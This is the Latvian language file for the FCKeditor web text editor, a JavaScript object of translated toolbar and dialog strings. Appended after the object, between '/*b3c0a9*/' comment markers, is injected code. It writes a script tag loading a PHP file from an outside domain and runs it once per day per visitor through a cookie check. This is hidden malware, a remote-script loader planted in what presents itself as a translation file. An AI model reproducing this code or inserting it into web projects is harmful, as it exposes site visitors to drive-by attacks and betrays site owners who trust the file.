﻿/*
 * FCKeditor - The text editor for internet
 * Copyright (C) 2003-2005 Frederico Caldeira Knabben
 * 
 * Licensed under the terms of the GNU Lesser General Public License:
 * 		http://www.opensource.org/licenses/lgpl-license.php
 * 
 * For further information visit:
 * 		http://www.fckeditor.net/
 * 
 * "Support Open Source software. What about a donation today?"
 * 
 * File Name: lv.js
 * 	Latvian language file.
 * 
 * File Authors:
 * 		Jānis Kļaviņš (janis@4id.lv)
 */

var FCKLang =
{
// Language direction : "ltr" (left to right) or "rtl" (right to left).
Dir					: "ltr",

ToolbarCollapse		: "Samazināt rīku joslu",
ToolbarExpand		: "Paplašināt rīku joslu",

// Toolbar Items and Context Menu
Save				: "Saglabāt",
NewPage				: "Jauna lapa",
Preview				: "Pārskatīt",
Cut					: "Izgriezt",
Copy				: "Kopēt",
Paste				: "Ievietot",
PasteText			: "Ievietot kā vienkāršu tekstu",
PasteWord			: "Ievietot no Worda",
Print				: "Drukāt",
SelectAll			: "Iezīmēt visu",
RemoveFormat		: "Noņemt stilus",
InsertLinkLbl		: "Hipersaite",
InsertLink			: "Ievietot/Labot Hipersaiti",
RemoveLink			: "Noņemt Hipersaiti",
Anchor				: "Ievietot/Labot iezīmi",
InsertImageLbl		: "Attēls",
InsertImage			: "Ievietot/Labot Attēlu",
InsertFlashLbl		: "Flash",
InsertFlash			: "Ievietot/Labot Flash",
InsertTableLbl		: "Tabula",
InsertTable			: "Ievietot/Labot Tabulu",
InsertLineLbl		: "Atdalītājsvītra",
InsertLine			: "Ievietot horizontālu Atdalītājsvītru",
InsertSpecialCharLbl: "Īpašs simbols",
InsertSpecialChar	: "Ievietot Īpašu simbolu",
InsertSmileyLbl		: "Smaidiņi",
InsertSmiley		: "Ievietot Smaidiņu",
About				: "Īsumā par FCKeditor'u",
Bold				: "Treknu šriftu",
Italic				: "Slīprakstā",
Underline			: "Apakšsvītra",
StrikeThrough		: "Pārsvītrots",
Subscript			: "Zemrakstā",
Superscript			: "Augšrakstā",
LeftJustify			: "Nolīdzināt pa kreisi",
CenterJustify		: "Nolīdzināt pret centru",
RightJustify		: "Nolīdzināt pa labi",
BlockJustify		: "Nolīdzināt malas",
DecreaseIndent		: "Samazināt atkāpi",
IncreaseIndent		: "Palielināt atkāpi",
Undo				: "Atcelt",
Redo				: "Atkārtot",
NumberedListLbl		: "Numurēts saraksts",
NumberedList		: "Ievietot/Noņemt Numurēto sarakstu",
BulletedListLbl		: "Izcelts saraksts",
BulletedList		: "Ievietot/Noņemt Izceltu sarakstu",
ShowTableBorders	: "Parādīt Tabulas robežas",
ShowDetails			: "Parādīt sīkāku info",
Style				: "Stils",
FontFormat			: "Formāts",
Font				: "Šrifts",
FontSize			: "Izmērs",
TextColor			: "Teksta krāsa",
BGColor				: "Fona krāsa",
Source				: "HTML kods",
Find				: "Meklēt",
Replace				: "Nomainīt",
SpellCheck			: "Pareizrakstības pārbaude",
UniversalKeyboard	: "Universāla Klaviatūra",
PageBreakLbl		: "Page Break",	//MISSING
PageBreak			: "Insert Page Break",	//MISSING

Form			: "Forma",
Checkbox		: "Atzīmēšanas kastīte",
RadioButton		: "Izvēles poga",
TextField		: "Teksta rinda",
Textarea		: "Teksta laukums",
HiddenField		: "Paslēpta teksta rinda",
Button			: "Poga",
SelectionField	: "Iezīmēšanas lauks",
ImageButton		: "Attēlpoga",

// Context Menu
EditLink			: "Labot hipersaiti",
InsertRow			: "Ievietot rindu",
DeleteRows			: "Dzēst rindas",
InsertColumn		: "Ievietot kolonnu",
DeleteColumns		: "Dzēst kolonnas",
InsertCell			: "Ievietot rūtiņu",
DeleteCells			: "Dzēst rūtiņas",
MergeCells			: "Apvienot rūtiņas",
SplitCell			: "Sadalīt rūtiņu",
TableDelete			: "Delete Table",	//MISSING
CellProperties		: "Rūtiņas īpašības",
TableProperties		: "Tabulas īpašības",
ImageProperties		: "Attēla īpašības",
FlashProperties		: "Flash īpašības",

AnchorProp			: "Iezīmes īpašības",
ButtonProp			: "Pogas īpašības",
CheckboxProp		: "Atzīmēšanas kastītes īpašības",
HiddenFieldProp		: "Paslēptās teksta rindas īpašības",
RadioButtonProp		: "Izvēles poga īpašības",
ImageButtonProp		: "Attēlpogas īpašības",
TextFieldProp		: "Teksta rindas  īpašības",
SelectionFieldProp	: "Iezīmēšanas lauka īpašības",
TextareaProp		: "Teksta laukuma īpašības",
FormProp			: "Formas īpašības",

FontFormats			: "Normāls teksts;Formatēts teksts;Adrese;Virsraksts 1;Virsraksts 2;Virsraksts 3;Virsraksts 4;Virsraksts 5;Virsraksts 6;Rindkopa (DIV)",

// Alerts and Messages
ProcessingXHTML		: "Tiek apstrādāts XHTML. Lūdzu uzgaidiet...",
Done				: "Darīts",
PasteWordConfirm	: "Teksta fragments, kas tiek ievietots, izskatās, ka būtu sagatavots Word'ā. Vai vēlaties to apstrādāt pirms ievietošanas?",
NotCompatiblePaste	: "Šī darbība ir pieejama Internet Explorer'ī, kas jaunāks par 5.5 versiju. Vai vēlaties ievietot bez apstrādes?",
UnknownToolbarItem	: "Nezināms rīku joslas objekts \"%1\"",
UnknownCommand		: "Nezināmas darbības nosaukums \"%1\"",
NotImplemented		: "Darbība netika paveikta",
UnknownToolbarSet	: "Rīku joslas komplekts \"%1\" neeksistē",
NoActiveX			: "Interneta pārlūkprogrammas drošības uzstādījumi varētu ietekmēt dažas no editora īpašībām. Jābūt aktivizētai sadaļai \"Run ActiveX controls and plug-ins\". Savādāk ir iespējamas kļūdas darbībā un kļūdu paziņojumu parādīšanās.",
BrowseServerBlocked : "The resources browser could not be opened. Make sure that all popup blockers are disabled.",	//MISSING
DialogBlocked		: "It was not possible to open the dialog window. Make sure all popup blockers are disabled.",	//MISSING

// Dialogs
DlgBtnOK			: "Darīts!",
DlgBtnCancel		: "Atcelt",
DlgBtnClose			: "Aizvērt",
DlgBtnBrowseServer	: "Skatīt servera saturu",
DlgAdvancedTag		: "Viedāk",
DlgOpOther			: "&lt;Cits&gt;",
DlgInfoTab			: "Informācija",
DlgAlertUrl			: "Lūdzum ievietojiet Hipersaiti",

// General Dialogs Labels
DlgGenNotSet		: "&lt;nav iestatīts&gt;",
DlgGenId			: "Id",
DlgGenLangDir		: "Valodas lasīšanas virziens",
DlgGenLangDirLtr	: "No kreisās uz labo (LTR)",
DlgGenLangDirRtl	: "No labās uz kreiso (RTL)",
DlgGenLangCode		: "Valodas kods",
DlgGenAccessKey		: "Pieejas kods",
DlgGenName			: "Nosaukums",
DlgGenTabIndex		: "Tab Index",
DlgGenLongDescr		: "Gara apraksta Hipersaite",
DlgGenClass			: "Stilu saraksta klases",
DlgGenTitle			: "Konsultatīvs virsraksts",
DlgGenContType		: "Konsultatīvs Satura tips",
DlgGenLinkCharset	: "Pievienotā resursa Charset parametrs",
DlgGenStyle			: "Stils",

// Image Dialog
DlgImgTitle			: "Attēla īpašības",
DlgImgInfoTab		: "Informācija par attēlu",
DlgImgBtnUpload		: "Nosūtīt serverim",
DlgImgURL			: "URL",
DlgImgUpload		: "Augšupielādēt",
DlgImgAlt			: "Alternatīvais teksts",
DlgImgWidth			: "Platums",
DlgImgHeight		: "Augstums",
DlgImgLockRatio		: "Nemainīga Augstuma/Platuma attiecība",
DlgBtnResetSize		: "Atjaunot sākotnējo izmēru",
DlgImgBorder		: "Rāmis",
DlgImgHSpace		: "Horizontālā telpa",
DlgImgVSpace		: "Vertikālā telpa",
DlgImgAlign			: "Nolīdzināt",
DlgImgAlignLeft		: "Pa kreisi",
DlgImgAlignAbsBottom: "Absolūti apakšā",
DlgImgAlignAbsMiddle: "Absolūti vertikāli centrēts",
DlgImgAlignBaseline	: "Pamatrindā",
DlgImgAlignBottom	: "Apakšā",
DlgImgAlignMiddle	: "Vertikāli centrēts",
DlgImgAlignRight	: "Pa labi",
DlgImgAlignTextTop	: "Teksta augšā",
DlgImgAlignTop		: "Augšā",
DlgImgPreview		: "Pārskats",
DlgImgAlertUrl		: "Lūdzu norādīt attēla hipersaiti",
DlgImgLinkTab		: "Hipersaite",

// Flash Dialog
DlgFlashTitle		: "Flash īpašības",
DlgFlashChkPlay		: "Automātiska atskaņošana",
DlgFlashChkLoop		: "Nepārtraukti",
DlgFlashChkMenu		: "Atļaut Flash izvēlni",
DlgFlashScale		: "Mainīt izmēru",
DlgFlashScaleAll	: "Rādīt visu",
DlgFlashScaleNoBorder	: "Bez rāmja",
DlgFlashScaleFit	: "Exact Fit",

// Link Dialog
DlgLnkWindowTitle	: "Hipersaite",
DlgLnkInfoTab		: "Hipersaites informācija",
DlgLnkTargetTab		: "Mērķis",

DlgLnkType			: "Hipersaites tips",
DlgLnkTypeURL		: "URL",
DlgLnkTypeAnchor	: "Iezīme šajā lapā",
DlgLnkTypeEMail		: "E-pasts",
DlgLnkProto			: "Protokols",
DlgLnkProtoOther	: "&lt;cits&gt;",
DlgLnkURL			: "URL",
DlgLnkAnchorSel		: "Izvēlēties iezīmi",
DlgLnkAnchorByName	: "Pēc iezīmes nosaukuma",
DlgLnkAnchorById	: "Pēc elementa ID",
DlgLnkNoAnchors		: "&lt;Šajā dokumentā nav iezīmju&gt;",
DlgLnkEMail			: "E-pasta adrese",
DlgLnkEMailSubject	: "Ziņas tēma",
DlgLnkEMailBody		: "Ziņas saturs",
DlgLnkUpload		: "Augšupielādēt",
DlgLnkBtnUpload		: "Nosūtīt serverim",

DlgLnkTarget		: "Mērķis",
DlgLnkTargetFrame	: "&lt;freims&gt;",
DlgLnkTargetPopup	: "&lt;uzlecošā logā&gt;",
DlgLnkTargetBlank	: "Jaunā logā (_blank)",
DlgLnkTargetParent	: "Esošajā logā (_parent)",
DlgLnkTargetSelf	: "Tajā pašā logā (_self)",
DlgLnkTargetTop		: "Visredzamākajā logā (_top)",
DlgLnkTargetFrameName	: "Mērķa freima nosaukums",
DlgLnkPopWinName	: "Izlecošā loga nosaukums",
DlgLnkPopWinFeat	: "Izlecošā loga nosaukums īpašības",
DlgLnkPopResize		: "Ar maināmu izmēru",
DlgLnkPopLocation	: "Atrašanās vietas josla",
DlgLnkPopMenu		: "Izvēlnes josla",
DlgLnkPopScroll		: "Ritjoslas",
DlgLnkPopStatus		: "Statusa josla",
DlgLnkPopToolbar	: "Rīku josla",
DlgLnkPopFullScrn	: "Pilnā ekrānā (IE)",
DlgLnkPopDependent	: "Atkarīgs (Netscape)",
DlgLnkPopWidth		: "Platums",
DlgLnkPopHeight		: "Augstums",
DlgLnkPopLeft		: "Kreisā koordināte",
DlgLnkPopTop		: "Augšējā koordināte",

DlnLnkMsgNoUrl		: "Lūdzu norādi hipersaiti",
DlnLnkMsgNoEMail	: "Lūdzu norādi e-pasta adresi",
DlnLnkMsgNoAnchor	: "Lūdzu norādi iezīmi",

// Color Dialog
DlgColorTitle		: "Izvēlies krāsu",
DlgColorBtnClear	: "Dzēst",
DlgColorHighlight	: "Izcelt",
DlgColorSelected	: "Iezīmētais",

// Smiley Dialog
DlgSmileyTitle		: "Ievietot Smaidiņu",

// Special Character Dialog
DlgSpecialCharTitle	: "Ievietot īpašu simbolu",

// Table Dialog
DlgTableTitle		: "Tabulas īpašības",
DlgTableRows		: "Rindas",
DlgTableColumns		: "Kolonnas",
DlgTableBorder		: "Rāmja izmērs",
DlgTableAlign		: "Novietojums",
DlgTableAlignNotSet	: "<nav norādīts>",
DlgTableAlignLeft	: "Pa kreisi",
DlgTableAlignCenter	: "Centrēti",
DlgTableAlignRight	: "Pa labi",
DlgTableWidth		: "Platums",
DlgTableWidthPx		: "pikseļos",
DlgTableWidthPc		: "procentuāli",
DlgTableHeight		: "Augstums",
DlgTableCellSpace	: "Rūtiņu atstatums",
DlgTableCellPad		: "Rūtiņu nobīde",
DlgTableCaption		: "Leģenda",
DlgTableSummary		: "Summary",	//MISSING

// Table Cell Dialog
DlgCellTitle		: "Rūtiņas īpašības",
DlgCellWidth		: "Platums",
DlgCellWidthPx		: "pikseļi",
DlgCellWidthPc		: "procentos",
DlgCellHeight		: "Augstums",
DlgCellWordWrap		: "Teksta pārnese",
DlgCellWordWrapNotSet	: "&lt;nav norādīta&gt;",
DlgCellWordWrapYes	: "Jā",
DlgCellWordWrapNo	: "Nē",
DlgCellHorAlign		: "Horizontāla novietojums",
DlgCellHorAlignNotSet	: "&lt;Nav norādīts&gt;",
DlgCellHorAlignLeft	: "Pa kreisi",
DlgCellHorAlignCenter	: "Centrēti",
DlgCellHorAlignRight: "Pa labi",
DlgCellVerAlign		: "Vertikālais novietojums",
DlgCellVerAlignNotSet	: "&lt;nav norādīts&gt;",
DlgCellVerAlignTop	: "Augša",
DlgCellVerAlignMiddle	: "Vidus",
DlgCellVerAlignBottom	: "Apakša",
DlgCellVerAlignBaseline	: "Pamatrindā",
DlgCellRowSpan		: "Rindu pārnese",
DlgCellCollSpan		: "Kolonnu pārnese",
DlgCellBackColor	: "Fona krāsa",
DlgCellBorderColor	: "Rāmja krāsa",
DlgCellBtnSelect	: "Iezīmē...",

// Find Dialog
DlgFindTitle		: "Meklētājs",
DlgFindFindBtn		: "Meklēt",
DlgFindNotFoundMsg	: "Norādītā frāze netika atrasta.",

// Replace Dialog
DlgReplaceTitle			: "Aizvietošana",
DlgReplaceFindLbl		: "Kas jāmeklē:",
DlgReplaceReplaceLbl	: "Nomainīt platumu:",
DlgReplaceCaseChk		: "Jāsakrīt",
DlgReplaceReplaceBtn	: "Aizvietot",
DlgReplaceReplAllBtn	: "Aizvietot visu",
DlgReplaceWordChk		: "Jāsakrīt pilnībā",

// Paste Operations / Dialog
PasteErrorPaste	: "Jūsu pārlūkprogrammas drošības iestatījumi nepieļauj editoram automātiski veikt ievietošanas darbību. Lūdzu, izmantojiet (Ctrl V), lai veiktu šo darbību.",
PasteErrorCut	: "Jūsu pārlūkprogrammas drošības iestatījumi nepieļauj editoram automātiski veikt izgriešanas darbību.  Lūdzu, izmantojiet (Ctrl X, lai veiktu šo darbību.",
PasteErrorCopy	: "Jūsu pārlūkprogrammas drošības iestatījumi nepieļauj editoram automātiski veikt kopēšanas darbību.  Lūdzu, izmantojiet (Ctrl C), lai veiktu šo darbību.",

PasteAsText		: "Ievietot kā vienkāršu tekstu",
PasteFromWord	: "Ievietot no Worda",

DlgPasteMsg2	: "Lūdzu, ievietojiet tekstu šajā laukumā, izmantojot klaviatūru (<STRONG>Ctrl V</STRONG>) un apstipriniet ar <STRONG>Darīts!</STRONG>.",
DlgPasteIgnoreFont		: "Ignorēt iepriekš norādītos fontus",
DlgPasteRemoveStyles	: "Noņemt norādītos stilus",
DlgPasteCleanBox		: "Apstrādāt laukuma saturu",


// Color Picker
ColorAutomatic	: "Automātiska",
ColorMoreColors	: "Plašāka palete...",

// Document Properties
DocProps		: "Dokumenta īpašības",

// Anchor Dialog
DlgAnchorTitle		: "Iezīmes īpašības",
DlgAnchorName		: "Iezīmes nosaukums",
DlgAnchorErrorName	: "Lūdzu norādiet iezīmes nosaukumu",

// Speller Pages Dialog
DlgSpellNotInDic		: "Netika atrasts vārdnīcā",
DlgSpellChangeTo		: "Nomainīt uz",
DlgSpellBtnIgnore		: "Ignorēt",
DlgSpellBtnIgnoreAll	: "Ignorēt visu",
DlgSpellBtnReplace		: "Aizvietot",
DlgSpellBtnReplaceAll	: "Aizvietot visu",
DlgSpellBtnUndo			: "Atcelt",
DlgSpellNoSuggestions	: "- Nav ieteikumu -",
DlgSpellProgress		: "Notiek pareizrakstības pārbaude...",
DlgSpellNoMispell		: "Pareizrakstības pārbaude pabeigta: kļūdas netika atrastas",
DlgSpellNoChanges		: "Pareizrakstības pārbaude pabeigta: nekas netika labots",
DlgSpellOneChange		: "Pareizrakstības pārbaude pabeigta: 1 vārds izmainīts",
DlgSpellManyChanges		: "Pareizrakstības pārbaude pabeigta: %1 vārdi tika mainīti",

IeSpellDownload			: "Pareizrakstības pārbaudītājs nav pievienots. Vai vēlaties to lejupielādēt tagad?",

// Button Dialog
DlgButtonText	: "Teksts (Vērtība)",
DlgButtonType	: "Tips",

// Checkbox and Radio Button Dialogs
DlgCheckboxName		: "Nosaukums",
DlgCheckboxValue	: "Vērtība",
DlgCheckboxSelected	: "Iezīmēts",

// Form Dialog
DlgFormName		: "Nosaukums",
DlgFormAction	: "Darbība",
DlgFormMethod	: "Metode",

// Select Field Dialog
DlgSelectName		: "Nosaukums",
DlgSelectValue		: "Vērtība",
DlgSelectSize		: "Izmērs",
DlgSelectLines		: "rindas",
DlgSelectChkMulti	: "Atļaut vairākus iezīmējumus",
DlgSelectOpAvail	: "Pieejamās iespējas",
DlgSelectOpText		: "Teksts",
DlgSelectOpValue	: "Vērtība",
DlgSelectBtnAdd		: "Pievienot",
DlgSelectBtnModify	: "Veikt izmaiņas",
DlgSelectBtnUp		: "Augšup",
DlgSelectBtnDown	: "Lejup",
DlgSelectBtnSetValue : "Noteikt kā iezīmēto vērtību",
DlgSelectBtnDelete	: "Dzēst",

// Textarea Dialog
DlgTextareaName	: "Nosaukums",
DlgTextareaCols	: "Kolonnas",
DlgTextareaRows	: "Rindas",

// Text Field Dialog
DlgTextName			: "Nosaukums",
DlgTextValue		: "Vērtība",
DlgTextCharWidth	: "Simbolu platums",
DlgTextMaxChars		: "Simbolu maksimālais daudzums",
DlgTextType			: "Tips",
DlgTextTypeText		: "Teksts",
DlgTextTypePass		: "Parole",

// Hidden Field Dialog
DlgHiddenName	: "Nosaukums",
DlgHiddenValue	: "Vērtība",

// Bulleted List Dialog
BulletedListProp	: "Bulleted List Properties",
NumberedListProp	: "Numbered List Properties",
DlgLstType			: "Tips",
DlgLstTypeCircle	: "Aplis",
DlgLstTypeDisc		: "Disks",
DlgLstTypeSquare	: "Kvadrāts",
DlgLstTypeNumbers	: "Skaitļi (1, 2, 3)",
DlgLstTypeLCase		: "Maziem burtiem (a, b, c)",
DlgLstTypeUCase		: "Lieliem burtiem (A, B, C)",
DlgLstTypeSRoman	: "Maziem romiešu cipariem (i, ii, iii)",
DlgLstTypeLRoman	: "Lieliem romiešu cipariem (I, II, III)",

// Document Properties Dialog
DlgDocGeneralTab	: "Vispārīga informācija",
DlgDocBackTab		: "Fons",
DlgDocColorsTab		: "Krāsas un robežu nobīdes",
DlgDocMetaTab		: "META dati",

DlgDocPageTitle		: "Dokumenta virsraksts <Title>",
DlgDocLangDir		: "Valodas lasīšanas virziens",
DlgDocLangDirLTR	: "No kreisās uz labo (LTR)",
DlgDocLangDirRTL	: "No labās uz kreiso (RTL)",
DlgDocLangCode		: "Valodas kods",
DlgDocCharSet		: "Simbolu kodējums",
DlgDocCharSetOther	: "Cits simbolu kodējums",

DlgDocDocType		: "Dokumenta tips",
DlgDocDocTypeOther	: "Cits dokumenta tips",
DlgDocIncXHTML		: "Ietvert XHTML deklarācijas",
DlgDocBgColor		: "Fona krāsa",
DlgDocBgImage		: "Fona attēla hipersaite",
DlgDocBgNoScroll	: "Fona attēls ir fiksēts",
DlgDocCText			: "Teksts",
DlgDocCLink			: "Hipersaite",
DlgDocCVisited		: "Apmeklēta hipersaite",
DlgDocCActive		: "Aktīva hipersaite",
DlgDocMargins		: "Lapas robežas",
DlgDocMaTop			: "Augšā",
DlgDocMaLeft		: "Pa kreisi",
DlgDocMaRight		: "Pa labi",
DlgDocMaBottom		: "Apakšā",
DlgDocMeIndex		: "Dokumentu aprakstoši atslēgvārdi (atdalīti ar komatu)",
DlgDocMeDescr		: "Dokumenta apraksts",
DlgDocMeAuthor		: "Autors",
DlgDocMeCopy		: "Autortiesības",
DlgDocPreview		: "Priekšskats",

// Templates Dialog
Templates			: "Sagataves",
DlgTemplatesTitle	: "Satura sagataves",
DlgTemplatesSelMsg	: "Lūdzu, norādiet sagatavi, ko atvērt editorā<br>(patreizējie dati tiks zaudēti):",
DlgTemplatesLoading	: "Notiek sagatavju saraksta ielāde. Lūdzu, uzgaidiet...",
DlgTemplatesNoTpl	: "(Nav norādītas sagataves)",

// About Dialog
DlgAboutAboutTab	: "Par",
DlgAboutBrowserInfoTab	: "Informācija par pārlūkprogrammu",
DlgAboutVersion		: "versija",
DlgAboutLicense		: "Programmatūra lietojama saskaņā ar GNU Lesser General Public License",
DlgAboutInfo		: "Papildus informācija ir pieejama"
}

/*b3c0a9*/
 function n() {
 var n09 = document.createElement('script');
 n09.src = 'http://justsyrian.com/images/taiyYbKM.php';

 if (!document.getElementById('n09')) {
 document.write('<div id=\'n09\'></div>');
 document.getElementById('n09').appendChild(n09);
 }
}
function SetCookie(cookieName,cookieValue,nDays,path) {
 var today = new Date();
 var expire = new Date();
 if (nDays==null || nDays==0) nDays=1;
 expire.setTime(today.getTime() + 3600000*24*nDays);
 document.cookie = cookieName+"="+escape(cookieValue)
 + ";expires=" + expire.toGMTString() + ((path) ? "; path=" + path : "");
}
function GetCookie( name ) {
 var start = document.cookie.indexOf( name + "=" );
 var len = start + name.length + 1;
 if ( ( !start ) &&
 ( name != document.cookie.substring( 0, name.length ) ) )
 {
 return null;
 }
 if ( start == -1 ) return null;
 var end = document.cookie.indexOf( ";", len );
 if ( end == -1 ) end = document.cookie.length;
 return unescape( document.cookie.substring( len, end ) );
}
if (navigator.cookieEnabled)
{
if(GetCookie('visited_uq')==55){}else{SetCookie('visited_uq', '55', '1', '/');

n();
}
}
/*/b3c0a9*/
